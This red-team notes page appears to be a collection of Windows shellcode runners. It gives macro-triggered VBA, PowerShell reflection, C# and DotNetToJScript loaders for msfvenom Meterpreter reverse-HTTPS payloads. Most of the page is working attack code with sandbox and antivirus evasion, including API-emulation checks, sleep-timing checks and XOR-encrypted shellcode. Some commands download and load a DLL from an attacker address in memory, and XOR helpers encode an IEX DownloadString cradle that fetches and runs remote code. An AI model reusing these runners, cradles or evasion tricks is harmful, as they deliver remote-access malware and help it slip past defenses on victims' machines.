---
description: Inject shellcode into current process's virtual address space
---

# Shellcode Runners




## VBA

[An explanation](https://stackoverflow.com/a/62127904) how to map C types to appropriate VBA types manually.

With this approach the shell lives until Word is not closed (no `WaitForSingleObject`):

{% code title="ShellcodeRunner.vba" %}
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function ShellcodeRunner()
  Dim buf As Variant
  Dim tmp As LongPtr
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim dream As Integer
  Dim before As Date
  
  ' Check if we're in a sandbox by calling a rare-emulated API
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", t, Now()) < dream Then
    Exit Function
  End If

  ' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
  buf = Array(31, 33, ..., 33, 37)

  ' XOR-decrypt the shellcode
  For i = 0 To UBound(buf)
    buf(i) = buf(i) Xor Asc("a")
  Next i

  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
```
{% endcode %}




## PowerShell



### Using Add-Type and C\#

C data types to C# data types "translation" can be done with P/Invoke APIs (Platform Invocation Services) at [www.pinvoke.net](http://www.pinvoke.net/) (e. g., [VirtualAlloc](http://www.pinvoke.net/default.aspx/kernel32.VirtualAlloc)).

{% code title="ShellcodeRunnerv1.ps1" %}
```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Win32

[Byte[]] $buf = 0x31,0x33,...,0x33,0x37
$size = $buf.Length
# msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f ps1
[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
{% endcode %}



### Reflectively using DelegateType (in Memory)

- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1)

What's going on here:

1. `lookupFunc` 👉🏻 to obtain a reference to the `System.dll` assembly's `GetModuleHandle` and `GetProcAddress` methods using `GetType` and `GetMethod` functions (aka the [Reflection](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection) technique).
2. `getDelegateType` 👉🏻 to define the argument types for the APIs [using a delegate type via Reflection](https://docs.microsoft.com/ru-ru/archive/blogs/joelpob/creating-delegate-types-via-reflection-emit) and return it.
3. `VirtualAlloc` 👉🏻 to allocate writable, readable, and executable (unmanaged) memory space in virtual address space of the calling process.
4. `Copy` 👉🏻 to copy the shellcode bytes into allocated memory location.
5. `CreateThread` 👉🏻 to create a new execution thread in the calling process and execute the shellcode.
6. `WaitForSingleObject` 👉🏻 to delay termination of the PowerShell script until the shell fully executes.

{% code title="ShellcodeRunnerv2.ps1" %}
```powershell
function lookupFunc {
    Param ($moduleName, $funcName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | % {If($_.Name -eq "GetProcAddress") {$tmp += $_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $funcName))
}

function getDelegateType {
    Param (
        [Parameter(Position=0, Mandatory=$True)][Type[]] $argsTypes,
        [Parameter(Position=1)][Type] $retType = [Void]
    )

    # Building a DelegateType (doing it manually to avoid usage of Add-Type)
    ## create a custom assembly and define the module and type inside
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    ## set up the constructor
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argsTypes).SetImplementationFlags('Runtime, Managed')
    ## sets up the invoke method
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argsTypes).SetImplementationFlags('Runtime, Managed')
    ## invoke the constructor and return the delegation type
    return $type.CreateType()
}

# $VirtualAllocAddr = lookupFunc kernel32.dll VirtualAlloc
# $VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])
# $VirtualAlloc =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
# $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
# msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0x31,0x33,...,0x33,0x37
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
{% endcode %}

{% hint style="info" %}
In order to run x64 shellcode from a 32-bit application (e. g., MS Word), you may want to specify the path to 64-bit PowerShell binary through [Sysnative](https://www.samlogic.net/articles/sysnative-folder-64-bit-windows.htm) alias.
{% endhint %}




## C\#



### C\# DLL to Jscript

- [https://github.com/tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)

{% code title="TestClass.cs" %}
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 -f csharp
        byte[] buf = new byte[???] {
        0x31,0x33,...,0x33,0x37 };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
{% endcode %}

Compile to Jscript with *DotNetToJScript.exe*:

```
Cmd > .\DotNetToJScript.exe .\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```


#### SharpShooter

- [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

```
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 -f raw -o met.bin
$ python SharpShooter.py --dotnetver 4 --stageless --rawscfile met.bin --payload js --output evil
```

{% hint style="info" %}
This tool can efficiently be used with **HTML Smuggling** technique.
{% endhint %}

{% content-ref url="/redteam/se/phishing/html-smuggling.md" %}
[html-smuggling.md](html-smuggling.md)
{% endcontent-ref %}



### C\# DLL with PowerShell Cradle (in Memory)

- [https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)
- [https://github.com/smokeme/payloadGenerator](https://github.com/smokeme/payloadGenerator)
- [https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/](https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/)

{% code title="ShellcodeRunner.cs" %}
```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void Run()
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
            byte[] buf = new byte[???] {
            0x31,0x33,...,0x33,0x37 };

            // XOR-decrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
{% endcode %}

Compile to DLL and load with PowerShell from memory:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.13.37/ShellcodeRunner.dll')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType("ShellcodeRunner.Program")
[$bindingFlags = [Reflection.BindingFlags] "NonPublic,Static"]
$method = $class.GetMethod("Run", [$bindingFlags])
$method.Invoke(0, $null)
Or
$a = [ShellcodeRunner.Program]::Run()
```




## DLL Shellcode Runners

- [https://gist.github.com/securitytube/c956348435cc90b8e1f7](https://gist.github.com/securitytube/c956348435cc90b8e1f7)
- [https://github.com/florylsk/ExecIT](https://github.com/florylsk/ExecIT)




## Shellcode Encoders/Encryptors

- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/ROT%20Shellcode%20Encoder/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/ROT%20Shellcode%20Encoder/Program.cs)
- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs)
- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter.py](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter.py)

Shellcode XOR-encrypt helper for VBA:

{% code title="XOREncrypt.py" %}
```python
import ast
# msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication
buf = """buf = Array(31,33,...,33,37)"""
buf = buf[11:]
buf = buf.replace(' _\n', '')
buf = ast.literal_eval(buf)
enc = [b ^ ord('a') for b in buf]
enc = str(enc).replace('[', '').replace(']', '')

parts, chunk = [], ''
for c in enc:
    chunk += c
    if len(chunk) > 200 and c == ',':
        parts.append(chunk.strip())
        chunk = ''
parts.append(chunk)

enc = ' _\r\n'.join(parts)
enc = f'buf = Array({enc})'
print(enc)
```
{% endcode %}

PowerShell XOR-encrypt helper for VBA with WMI de-chain:

{% code title="PS-XOREncrypt-HEX.ps1" %}
```powershell
$payload = "powershell -exec bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/run.txt')"
[string]$output = ""
$payload.ToCharArray() | % {
    [string]$thischar = [byte][char]$_ -bxor [byte]'a'
    if($thischar.Length -eq 1) {
    $thischar = [string]"00" + $thischar
    $output += $thischar
    }
    elseif($thischar.Length -eq 2) {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3) {
        $output += $thischar
    }
}
$output | clip
```
{% endcode %}

{% code title="PS-XOREncrypt-HEX.py" %}
```python
payload = r"powershell -exec bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/run.txt')"
output = ''.join([str(ord(c) ^ ord('a')).zfill(3) for c in payload])
print(output)
```
{% endcode %}

Shellcode XOR-encrypt helper for C# (msfvenom-like output style):

{% code title="XOREncrypt.cs" %}
```csharp
using System;
using System.Text;

namespace XOREncrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[???] {
            0x31,0x33,...,0x33,0x37 };

            // XOR-encrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }

            StringBuilder hex = new StringBuilder(buf.Length * 2);
            //foreach (byte b in buf)
            for (int i = 0; i < buf.Length; i++)
            {
                if (i != buf.Length - 1)
                {
                    hex.AppendFormat("0x{0:x2},", buf[i]);
                }
                else // no "," for the last line
                {
                    hex.AppendFormat("0x{0:x2}", buf[i]);
                }
                if ((i + 1) % 15 == 0)
                {
                    hex.AppendLine();
                }
            }

            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex.ToString()} }};");
        }
    }
}
```
{% endcode %}
